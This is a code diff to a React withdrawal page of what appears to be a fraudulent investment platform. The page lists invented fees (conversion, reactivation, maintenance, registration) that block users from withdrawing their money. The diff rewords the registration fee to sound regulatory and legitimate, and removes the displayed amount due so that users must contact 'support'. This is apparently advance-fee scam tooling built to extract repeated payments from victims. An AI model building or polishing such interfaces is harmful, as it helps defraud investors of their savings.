@@ -75,7 +75,7 @@ export default function Withdraw() {
     conversion: 'An Asset Conversion Fee is required to convert your holdings at the prevailing market rate, covering liquidity and network costs.',
     inactivity: 'Your account has been deactivated due to inactivity. A one-time Reactivation Fee is required to restore full access.',
     maintenance: 'An Account Maintenance Fee is required to keep your account active and ensure uninterrupted platform access.',
-    registration: 'A one-time Registration Fee is required to fully activate your account and unlock withdrawals. This final activation step verifies your identity and meets regulatory standards.',
+    registration: 'A one-time Registration Fee is required to activate your account and enable withdrawals, advanced trading features, and full investment access. This fee supports identity verification and regulatory compliance for international transactions. Completion of this step is required before withdrawal requests can be processed.',
   };
 
   const fetchUserFees = async () => {
@@ -464,12 +464,7 @@ export default function Withdraw() {
             <div style={{ color: '#555', fontSize: '11px', marginBottom: '14px', lineHeight: '1.55' }}>
               {FEE_DESCRIPTIONS[feePopup.type] || FEE_DESCRIPTIONS.processing}
             </div>
-            {parseFloat(feePopup.amount || 0) > 0 && (
-              <>
-                <div style={{ color: '#888', fontSize: '10px', fontWeight: '600', marginBottom: '4px', textTransform: 'uppercase', letterSpacing: '0.05em' }}>Amount Due</div>
-                <div style={{ color: '#ef4444', fontSize: '16px', fontWeight: '700', marginBottom: '16px' }}>${parseFloat(feePopup.amount).toLocaleString('en-US', {minimumFractionDigits: 2})}</div>
-              </>
-            )}
+
             <div style={{ color: '#555', fontSize: '10px', marginBottom: '18px', lineHeight: '1.55' }}>
               Dear Investor, you cannot perform this action until the required payment is settled. Please contact support to proceed.
             </div>
